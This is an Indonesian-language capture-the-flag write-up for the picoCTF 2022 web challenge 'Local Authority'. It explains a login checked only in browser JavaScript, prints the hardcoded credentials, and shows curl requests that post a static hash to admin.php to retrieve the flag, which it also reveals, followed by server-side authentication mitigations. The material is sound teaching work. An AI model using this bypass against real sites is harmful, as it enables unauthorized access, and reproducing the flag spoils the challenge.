# Writeup: Local Authority (Challenge ID: 278)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Client-Side Authentication Bypass
- **Difficulty:** Easy
- **Author:** LT 'syreal' Jones
- **Event:** picoCTF 2022
- **Points:** 100
- **Flag:** `academy{j5_15_7r4n5p4r3n7_28ad420c}`

---

## Problem Statement & Scope
Disediakan sebuah portal login "Secure Customer Portal" yang meminta username dan password. Peserta diminta menembus mekanisme autentikasi dan mendapatkan akses administratif untuk mengambil flag.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Client-Side Authentication Logic:** Aplikasi memvalidasi keabsahan username dan password langsung di browser menggunakan fungsi JavaScript (`checkPassword(username, password)` dalam `secure.js`).
2. **Ketiadaan Verifikasi Server-Side:** Server mempercayai input klien sepenuhnya. Ketika klien berhasil melakukan autentikasi lokal, form tersembunyi mengirimkan nilai token statis (`hash=2196812e91c29df34f5e217cfd639881`) ke `admin.php` tanpa memvalidasi sesi aktif atau cookie kredensial di sisi server (*Broken Authentication & Session Management*).

---

## Rekonstruksi Eksploitasi Step-by-Step
1. Coba lakukan login sembarang pada formulir `login.php`:
   ```bash
   curl -s -d "username=admin&password=admin&login=" http://xebec.cylabacademy.net:20085/login.php
   ```
2. Analisis respons HTML dari `login.php`. Perhatikan skrip eksternal yang dimuat:
   ```html
   <script src="secure.js"></script>
   ```
3. Unduh berkas `secure.js`:
   ```bash
   curl -s http://xebec.cylabacademy.net:20085/secure.js
   ```
   Isi berkas `secure.js`:
   ```javascript
   function checkPassword(username, password)
   {
     if( username === 'admin' && password === 'strongPassword098765' )
     {
       return true;
     }
     else
     {
       return false;
     }
   }
   ```
4. Teliti logika pengiriman form tersembunyi di `login.php`:
   ```javascript
   if(loggedIn) {
     document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
     document.getElementById('hiddenAdminForm').submit();
   }
   ```
5. Kirim request POST langsung ke `admin.php` membawa hash tersebut:
   ```bash
   curl -s -d "hash=2196812e91c29df34f5e217cfd639881" http://xebec.cylabacademy.net:20085/admin.php
   # Output memuat: academy{j5_15_7r4n5p4r3n7_28ad420c}
   ```

---

## Flag & Verifikasi
- **Flag:** `academy{j5_15_7r4n5p4r3n7_28ad420c}`
- **Verifikasi:** POST `/api/submissions/` mengembalikan respons `{"correct": true}` (HTTP Status 201).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Otentikasi Wajib Server-Side:** Proses verifikasi kredensial tidak boleh dilakukan di JavaScript frontend. Hash kata sandi harus dibandingkan dengan hash di database server (menggunakan algoritma hashing kuat seperti Argon2id atau bcrypt).
- **Pengelolaan Sesi yang Aman:** Otorisasi ke halaman administratif harus berbasis token sesi (misal JWT bertanda tangan kriptografis atau Session ID di Redis) yang dikirim lewat HTTP Cookie berbendera `HttpOnly`, `Secure`, dan `SameSite=Strict`.
